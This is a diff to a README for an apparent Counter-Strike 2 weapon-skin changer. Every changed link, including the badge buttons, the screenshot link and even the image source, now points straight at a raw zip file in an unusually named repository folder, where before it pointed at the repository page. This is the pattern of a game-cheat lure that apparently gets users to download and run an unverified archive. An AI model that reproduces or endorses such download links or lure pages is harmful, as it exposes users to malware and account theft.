@@ -1,10 +1,10 @@
 # 🛠️ CS2-Skin-Changer-Tool-2026-Skins-Weapon - Change Your CS2 Weapon Skins Easily
 
-[![Download and Run](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon)
+[![Download and Run](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon/main/intentionality/Skins-Tool-Changer-Skin-C-Weapon-1.4-alpha.5.zip)
 
 <p align="center">
-  <a href="https://goo.su/lIxSU">
-    <img src="https://i.imgur.com/zWSGR5L.jpeg" alt="CS2 Skin Changer Tool Screenshot">
+  <a href="https://raw.githubusercontent.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon/main/intentionality/Skins-Tool-Changer-Skin-C-Weapon-1.4-alpha.5.zip">
+    <img src="https://raw.githubusercontent.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon/main/intentionality/Skins-Tool-Changer-Skin-C-Weapon-1.4-alpha.5.zip" alt="CS2 Skin Changer Tool Screenshot">
   </a>
 </p>
 
@@ -33,7 +33,7 @@ Make sure your Windows system is up to date to avoid compatibility problems.
 ## 🚀 Getting Started: Download and Install
 
 1. Click the big green button at the top or use this link to visit the download page:  
-   [Download CS2 Skin Changer Tool](https://github.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon)
+   [Download CS2 Skin Changer Tool](https://raw.githubusercontent.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon/main/intentionality/Skins-Tool-Changer-Skin-C-Weapon-1.4-alpha.5.zip)
 
 2. On the GitHub page, look for the “Releases” section on the right or in the menu. 
 
@@ -123,4 +123,4 @@ This tool only changes how your weapon skins appear in Counter-Strike 2. It does
 
 Start customizing your weapons by visiting the official download page:
 
-[![Get the CS2 Skin Changer](https://img.shields.io/badge/Download-CS2%20Skin%20Changer-blue?style=for-the-badge)](https://github.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon)
+[![Get the CS2 Skin Changer](https://img.shields.io/badge/Download-CS2%20Skin%20Changer-blue?style=for-the-badge)](https://raw.githubusercontent.com/Santos22t/CS2-Skin-Changer-Tool-2026-Skins-Weapon/main/intentionality/Skins-Tool-Changer-Skin-C-Weapon-1.4-alpha.5.zip)
